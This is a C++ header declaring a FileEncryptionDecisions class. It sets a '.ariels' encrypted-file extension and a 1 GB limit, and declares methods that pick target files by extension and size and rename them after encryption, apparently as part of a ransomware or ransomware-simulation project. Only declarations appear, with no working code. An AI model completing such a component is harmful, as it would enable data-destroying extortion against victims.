#pragma once

#include <filesystem>

#define GB 1'073'741'824
#define ENCRYPTED_FILE_EXTENTION ".ariels"

class FileEncryptionDecisions
{
public:
    bool ShouldIEncrypt(const std::string& filePath) const;
    static bool IsRegularFileExists(const std::filesystem::path& filePath);

private:
    bool IsTargetExtention(const std::string& filePath) const;
    bool IsBiggerThen1GB(const std::string& filePath) const;

public:
    void EncryptedFileExtension(const std::string& filePath);

private:
    static void RemoveEncryptedFileExtention(const std::string& filePath);
    void AddEncryptedFileExtention(const std::string& filePath);
};
